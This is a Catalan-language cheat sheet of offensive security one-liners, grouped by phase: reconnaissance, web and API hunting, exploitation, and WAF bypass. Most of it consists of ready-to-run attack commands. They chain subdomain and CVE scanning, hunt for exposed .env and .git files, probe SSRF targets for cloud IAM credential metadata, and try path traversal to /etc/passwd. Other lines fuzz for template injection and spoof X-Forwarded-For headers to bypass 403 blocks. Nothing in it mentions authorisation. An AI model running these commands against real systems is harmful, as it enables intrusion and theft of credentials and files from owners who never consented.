# ⚡ Power Workflows (Automation)

Recull de *one-liners* optimitzats per a operacions de seguretat, classificats per fase d'operació.

## 🔍 Fase 1: Recon & Enumeration
Fluxos per mapejar la superfície d'atac i descobrir on estan els actius reals.

- **Pipeline Completa (De domini a CVE):**
  `subfinder -d DOMINI -silent | naabu -silent | httpx -silent | nuclei -t cve/ -severity critical,high`
- **Subdomain Takeover Hunting:**
  `subfinder -d DOMINI -silent | nuclei -t takeovers/ -silent`
- **Visual Recon (Captures):**
  `subfinder -d DOMINI -silent | httpx -screenshot -system-chrome -silent`

## 🌐 Fase 2: Web & API Hunting
Anàlisi profunda de l'aplicació per trobar secrets, endpoints i paràmetres vulnerables.

- **Secrets en JavaScript:**
  `subfinder -d DOMINI -silent | httpx -silent | katana -d 5 -jc | nuclei -t exposures/`
- **APIs & Fuzzing:**
  `katana -u URL -d 5 -silent -em apis | uro | ffuf -w - -u URL/FUZZ -mc 200`
- **Exposició de Backups:**
  `httpx -l hosts.txt -path "/.env,/.git/config,/.backup" -mc 200`
- **Wayback Recon (Paràmetres històrics):**
  `gau DOMINI | uro | grep "?" | nuclei -t fuzzing/`

## 🚀 Fase 3: Exploitation & Post-Recon
Accions per confirmar vulnerabilitats i extreure dades.

- **SSRF Cloud Metadata Hunter:**
  `cat urls.txt | httpx -path "/latest/meta-data/iam/security-credentials/" -mc 200`
- **LFI to /etc/passwd:**
  `ffuf -w wordlist.txt -u "URL?file=../../../../../../../../etc/passwd" -mr "root:x"`
- **SSTI (Server Side Template Injection):**
  `cat urls.txt | nuclei -t vulnerabilities/generic/ssti-fuzz.yaml`
- **Open Redirect Testing:**
  `katana -u URL -silent | grep "=" | gau | httpx -path "///google.com/%2e%2e" -mc 302`

## 🛡️ Fase 4: WAF & Infrastructure
Estratègies per saltar proteccions i assegurar la infraestructura.

- **Origin IP Bypass:**
  `asnmap -i "ASN" -silent | naabu -silent | httpx -title`
- **403 Bypass (Headers):**
  `cat 403_urls.txt | httpx -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" -mc 200`
- **Neteja de Soroll:**
  `subfinder -d DOMINI -silent | naabu -silent -nc | httpx -silent -filter-code 403,404`
